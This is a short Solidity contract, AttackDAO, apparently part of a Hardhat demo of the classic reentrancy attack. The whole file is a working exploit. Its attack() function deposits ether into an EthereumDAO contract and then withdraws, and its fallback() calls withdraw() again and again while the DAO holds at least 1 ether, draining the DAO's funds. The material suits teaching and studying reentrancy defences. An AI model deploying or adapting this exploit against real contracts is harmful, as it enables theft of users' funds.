//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;
import "hardhat/console.sol";
import "./EthereumDAO.sol";

contract AttackDAO {
    EthereumDAO public etherDAO;

    constructor(address _etherStoreAddress) {
        etherDAO = EthereumDAO(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherDAO).balance >= 1 ether) {
            console.log(
                "run fallback() with DAO balance is: ",
                address(etherDAO).balance
            );
            etherDAO.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherDAO.deposit{value: msg.value}();
        etherDAO.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
